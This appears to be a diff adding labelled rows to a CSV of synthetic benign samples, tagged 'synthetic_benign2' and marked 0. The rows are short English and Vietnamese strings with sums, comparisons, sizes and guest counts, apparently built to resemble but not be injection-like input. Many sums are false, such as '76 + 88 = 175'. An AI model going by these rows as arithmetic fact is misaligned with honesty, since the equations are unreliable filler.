+75 or 22 guests are coming,0,synthetic_benign2
+75x94cm; trà sữa and áo thun,0,synthetic_benign2
+76 + 88 = 175,0,synthetic_benign2
+76 > 37 or 37 > 76,0,synthetic_benign2
+76 > 86 or 86 > 76,0,synthetic_benign2
+76 hoặc 8 người đi cùng sách,0,synthetic_benign2
+77 + 58 = 166,0,synthetic_benign2
+77 hoặc 71 người đi cùng Lan,0,synthetic_benign2
+77 hoặc 73 người đi cùng áo thun,0,synthetic_benign2
+77 or 38 cái cũng được,0,synthetic_benign2
+77 or 87 guests are coming,0,synthetic_benign2
+77x82cm; Bình and Bình,0,synthetic_benign2
+78 = 91 - 32,0,synthetic_benign2
+78 > 97 or 97 > 78,0,synthetic_benign2
+78 or 16 guests are coming,0,synthetic_benign2
+78 or 5 guests are coming,0,synthetic_benign2
+78x14cm; size M and size M,0,synthetic_benign2
+79 + 65 = 109,0,synthetic_benign2
+79 > 47 or 47 > 79,0,synthetic_benign2
+79 > 65 or 65 > 79,0,synthetic_benign2
+79 hoặc 36 người đi cùng Bình,0,synthetic_benign2
+79 hoặc 39 người đi cùng vé xe,0,synthetic_benign2
+79 hoặc 82 người đi cùng giày nam,0,synthetic_benign2
+79 hoặc 91 người đi cùng sách,0,synthetic_benign2
+79 or 14 guests are coming,0,synthetic_benign2
+79 or 76 guests are coming,0,synthetic_benign2
+79 or 95 cái cũng được,0,synthetic_benign2
+8 = 53 - 81,0,synthetic_benign2
+8 = 56 - 72,0,synthetic_benign2
+8 hoặc 13 người đi cùng size M,0,synthetic_benign2
+8 hoặc 4 người đi cùng gói cước,0,synthetic_benign2
+8 or 77 guests are coming,0,synthetic_benign2
+80 + 2 = 50,0,synthetic_benign2
+80 + 77 = 75,0,synthetic_benign2
+80 hoặc 44 người đi cùng gói cước,0,synthetic_benign2
+80 or 26 cái cũng được,0,synthetic_benign2
+80x66cm; vé xe and An,0,synthetic_benign2
+81 + 44 = 22,0,synthetic_benign2
+81 + 76 = 177,0,synthetic_benign2
+81 = 43 - 28,0,synthetic_benign2
+81 hoặc 88 người đi cùng đơn hàng,0,synthetic_benign2
+81 or 56 guests are coming,0,synthetic_benign2
+81x12cm; giày nam and kế hoạch Q4,0,synthetic_benign2
+81x61cm; Bình and kế hoạch Q4,0,synthetic_benign2
+82 + 9 = 134,0,synthetic_benign2
+82x58cm; cà phê and gói cước,0,synthetic_benign2
+83 + 77 = 89,0,synthetic_benign2
+83 > 17 or 17 > 83,0,synthetic_benign2
+83 > 79 or 79 > 83,0,synthetic_benign2
+83 or 93 guests are coming,0,synthetic_benign2
+83x26cm; kế hoạch Q4 and Minh,0,synthetic_benign2
+84 = 1 - 57,0,synthetic_benign2
+84 hoặc 7 người đi cùng đơn hàng,0,synthetic_benign2
+84 or 15 guests are coming,0,synthetic_benign2
+84 or 26 guests are coming,0,synthetic_benign2
+84 or 38 guests are coming,0,synthetic_benign2
+84 or 48 guests are coming,0,synthetic_benign2
+84x17cm; cà phê and vé xe,0,synthetic_benign2
+84x87cm; đơn hàng and menu,0,synthetic_benign2
+85 > 70 or 70 > 85,0,synthetic_benign2
+85 hoặc 36 người đi cùng gói cước,0,synthetic_benign2
+85 hoặc 51 người đi cùng menu,0,synthetic_benign2
+85 or 27 cái cũng được,0,synthetic_benign2
+85 or 41 guests are coming,0,synthetic_benign2
+85 or 64 guests are coming,0,synthetic_benign2
+85x95cm; bàn 4 and vé xe,0,synthetic_benign2
+86 + 29 = 195,0,synthetic_benign2
+86 > 75 or 75 > 86,0,synthetic_benign2
+86 > 78 or 78 > 86,0,synthetic_benign2
+86 hoặc 58 người đi cùng menu,0,synthetic_benign2
+86 hoặc 61 người đi cùng Minh,0,synthetic_benign2
+86 hoặc 84 người đi cùng menu,0,synthetic_benign2
+86 or 37 cái cũng được,0,synthetic_benign2
+86x10cm; size M and giày nam,0,synthetic_benign2
+86x76cm; menu and bàn 4,0,synthetic_benign2
+87 > 20 or 20 > 87,0,synthetic_benign2
+87 > 61 or 61 > 87,0,synthetic_benign2
+87 hoặc 98 người đi cùng sách,0,synthetic_benign2
+87 or 35 cái cũng được,0,synthetic_benign2
+88 = 96 - 95,0,synthetic_benign2
+88 > 48 or 48 > 88,0,synthetic_benign2
+88 hoặc 71 người đi cùng ca sáng,0,synthetic_benign2
+88 or 13 guests are coming,0,synthetic_benign2
+88 or 89 guests are coming,0,synthetic_benign2
+88x72cm; An and menu,0,synthetic_benign2
+89 = 56 - 23,0,synthetic_benign2
+89 hoặc 42 người đi cùng vé xe,0,synthetic_benign2
+89 hoặc 44 người đi cùng sách,0,synthetic_benign2
+89 or 14 guests are coming,0,synthetic_benign2
+89 or 42 cái cũng được,0,synthetic_benign2
+89 or 55 cái cũng được,0,synthetic_benign2
+89x10cm; Hà Nội and bàn 4,0,synthetic_benign2
+89x23cm; size M and ca sáng,0,synthetic_benign2
+89x56cm; gói cước and giày nam,0,synthetic_benign2
+89x70cm; Bình and sách,0,synthetic_benign2
+9 + 74 = 121,0,synthetic_benign2
+9 > 56 or 56 > 9,0,synthetic_benign2
+9 hoặc 30 người đi cùng Hà Nội,0,synthetic_benign2
+90 > 32 or 32 > 90,0,synthetic_benign2
+90 hoặc 63 người đi cùng cà phê,0,synthetic_benign2
+90 or 11 cái cũng được,0,synthetic_benign2
+90 or 46 cái cũng được,0,synthetic_benign2
+90 or 76 cái cũng được,0,synthetic_benign2
+91 > 45 or 45 > 91,0,synthetic_benign2
+91 > 87 or 87 > 91,0,synthetic_benign2
+91 hoặc 81 người đi cùng áo thun,0,synthetic_benign2
+91 or 35 cái cũng được,0,synthetic_benign2
+91 or 79 cái cũng được,0,synthetic_benign2
+92 + 88 = 166,0,synthetic_benign2
+92 > 1 or 1 > 92,0,synthetic_benign2
+92 hoặc 58 người đi cùng vé xe,0,synthetic_benign2
+92 or 66 guests are coming,0,synthetic_benign2
+92 or 76 guests are coming,0,synthetic_benign2
